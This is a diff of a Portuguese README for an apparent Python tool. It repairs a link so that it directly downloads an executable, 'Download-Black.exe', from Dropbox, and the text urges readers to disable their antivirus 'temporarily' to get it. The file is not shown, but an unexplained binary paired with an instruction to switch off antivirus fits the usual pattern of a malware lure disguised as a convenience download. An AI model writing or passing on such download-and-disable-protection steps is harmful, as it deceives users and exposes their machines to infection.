@@ -26,4 +26,4 @@ Para facilitar o uso e testes, deixei um arquivo chamado `data.json` como exempl
 
 Se você não quiser baixar a versão Python, disponibilizei um executável para facilitar. O link é direto, então ao clicar, o download será iniciado automaticamente. **Certifique-se de desativar temporariamente o antivírus apenas para baixar o executável**:
 
-[Download do Executável aqui]([https://github.com](https://www.dropbox.com/scl/fi/j3jd7mly0t51ak4yxns1a/Download-Black.exe?rlkey=4xm5bni6oj3ill1o7gon8udma&st=r03yr35f&dl=1)
+[Download do Executável aqui](https://www.dropbox.com/scl/fi/j3jd7mly0t51ak4yxns1a/Download-Black.exe?rlkey=4xm5bni6oj3ill1o7gon8udma&st=r03yr35f&dl=1)
